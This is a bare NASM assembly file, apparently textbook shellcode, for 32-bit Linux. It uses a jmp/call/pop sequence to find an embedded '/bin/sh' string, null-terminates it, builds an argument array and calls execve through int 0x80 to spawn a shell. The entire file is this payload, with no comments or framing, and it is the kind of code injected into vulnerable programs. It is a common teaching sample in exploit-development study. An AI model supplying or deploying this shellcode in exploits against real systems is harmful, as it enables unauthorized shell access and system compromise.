BITS 32

Section   .text
    global _start

_start:
    jmp short   GotoCall

shellcode:
    pop         esi
    xor         eax, eax
    mov byte    [esi + 7], al
    lea         ebx, [esi]
    mov long    [esi + 8], ebx
    mov long    [esi + 12], eax
    mov byte    al, 0x0b
    mov         ebx, esi
    lea         ecx, [esi + 8]
    lea         edx, [esi + 12]
    int         0x80

GotoCall:
    call        shellcode
    db          '/bin/sh/JAAAAKKKK'

